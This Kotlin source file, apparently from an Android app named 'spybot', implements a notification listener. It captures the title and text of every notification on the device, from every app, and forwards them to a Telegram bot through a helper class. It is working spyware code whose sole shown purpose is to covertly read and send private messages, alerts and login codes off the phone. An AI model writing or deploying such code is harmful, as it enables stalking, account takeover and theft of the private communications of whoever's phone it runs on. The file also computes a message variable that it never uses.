package com.example.spybot

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.spybot.helper.TelegramHelper

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        if (extras == null) return

        val packageName = sbn.packageName.toString()
        val appName = getAppName(packageName) ?: packageName
        
        val title = extras.getString(Notification.EXTRA_TITLE)?.takeIf { it.isNotEmpty() } ?: "No Title"
        val text = extras.getString(Notification.EXTRA_TEXT)?.takeIf { it.isNotEmpty() } ?: ""
        
        val largeText = extras.getString(Notification.EXTRA_BIG_TEXT)?.takeIf { it.isNotEmpty() } ?: text

        val messageContent = if (largeText != text && largeText.isNotEmpty()) {
            "$title\n$largeText"
        } else {
            "$title\n$text"
        }

        TelegramHelper.sendNotification(this, title, text, appName)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Optional log
    }

    private fun getAppName(packageName: String): String? {
        return try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: Exception) {
            null
        }
    }
}
